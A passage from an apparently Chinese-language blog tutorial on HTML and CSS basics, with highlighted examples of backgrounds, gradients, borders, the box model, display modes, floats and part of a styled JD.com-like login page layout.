class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="背景-CSS"><a href="#背景-CSS" class="headerlink" title="背景 CSS"></a>背景 CSS</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>背景<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.text</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">1600px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">750px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: slategray;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"png/1669804543.893689_SEED_989475991.png"</span>);</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*重复部分*/</span></span></span><br><span class="line"><span class="language-css">            <span class="comment">/*x轴不重复*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-repeat</span>: repeat-x;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*整张图片不重复*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*    定位*/</span></span></span><br><span class="line"><span class="language-css">            <span class="comment">/*他不能够出去这片 div区域*/</span></span></span><br><span class="line"><span class="language-css">            <span class="comment">/*X轴 Y轴*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-position</span>: <span class="number">50%</span> <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*另一个办法*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-position</span>: left top;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*填充整个背景 或者用%*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-size</span>: cover;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="渐变色CSS"><a href="#渐变色CSS" class="headerlink" title="渐变色CSS"></a>渐变色CSS</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>渐变色<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.text</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(to top right,purple,royalblue,silver);</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="边框-CSS"><a href="#边框-CSS" class="headerlink" title="边框 CSS"></a>边框 CSS</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.x1</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*定义边框 一共有四种边框 | 顺时针转动 可以定义四个*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-style</span>: double solid;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*顶部加线*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-top-style</span>: solid;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*左边加线*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-left-style</span>: dashed ;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*底部加线*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom-style</span>: double;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*右边加线*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-right-style</span>: dotted;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-color</span>: wheat red green purple;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*同时可以四个*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-width</span>: <span class="number">10px</span> <span class="number">20px</span> <span class="number">10px</span> <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*边框 像素 边框样式 边框颜色*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">10px</span> dotted pink;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"x1"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="BOX-CSS"><a href="#BOX-CSS" class="headerlink" title="BOX CSS"></a>BOX CSS</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>盒子模型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span>{</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*!*外间距 0 水平居中 *!*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">230px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">250px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.box</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> black solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-color</span>: red blue purple plum;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: paleturquoise ;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-style</span>: solid dashed double  ;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*拯救布局 使用 box-sizing : border-box*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*padding-top: 20px;*/</span></span></span><br><span class="line"><span class="language-css">            <span class="comment">/*padding-left: 40px;*/</span></span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>教育改变生活<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="块元素与内联元素"><a href="#块元素与内联元素" class="headerlink" title="块元素与内联元素"></a>块元素与内联元素</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Display<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> black solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*块元素转换内联元素*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline;</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*    如果样式的属性是 none 那就是隐藏*/</span></span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">span</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> black solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*内联转换成块元素*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*既可以内联也可以块元素*/</span></span></span><br><span class="line"><span class="language-css">            <span class="comment">/*display: inline-block;*/</span></span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="基于元素的浮动"><a href="#基于元素的浮动" class="headerlink" title="基于元素的浮动"></a>基于元素的浮动</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#BigBox</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: green;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> dotted red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.box1</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> black solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*div:第一个孩子*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#son1</span> {</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*向左边浮动*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#son2</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#son3</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#son4</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">clear</span>: both;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*清除浮动*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"BigBox"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"son1"</span> <span class="attr">class</span>=<span class="string">"box1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>第一个盒子<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"son2"</span> <span class="attr">class</span>=<span class="string">"box1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>第二个盒子<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"son3"</span> <span class="attr">class</span>=<span class="string">"box1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>第三个盒子<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"son4"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    删除标签内容，盒子会跟着变化--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>你好世界界你好世界你好世界你好世界你好世界你好世界你好世界你好世界<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="仿京东案例-完整版请移步文件"><a href="#仿京东案例-完整版请移步文件" class="headerlink" title="仿京东案例 完整版请移步文件"></a>仿京东案例 完整版请移步文件</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>京东登录页<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">header</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> black solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">"png/logo.png"</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-size</span>: <span class="number">250px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-position</span>: <span class="number">100px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">article</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> black solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">"png/banner.png"</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-size</span>: <span class="number">1100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-position</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#e93854</span> ;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#text1</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">370px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">35px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#666666</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*    登录框*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> white solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">380px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">910px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">45px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*    京东会员文字*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box_text1</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: 幼圆;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: left;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">35px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-indent</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*立即注册文字*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box_text2</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: 幼圆;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: right;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">right</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">bottom</span>: <span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#b61d1d</span> ;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bolder;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#icon5</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">390px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">bottom</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*账号框*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.box1</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.icon1</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">48px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">51px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box3</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">bottom</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box3_text1</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: right;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: -<span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">bottom</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box4</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> red solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: -<span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box3_text2</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: 幼圆;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: -<span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*    底部*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">footer</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> black solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.text10</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#6e6f6e</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: 幼圆;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span><span class="selector-pseudo">:link</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*移动到时*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: blue;</span></span><br><span class="line"><span 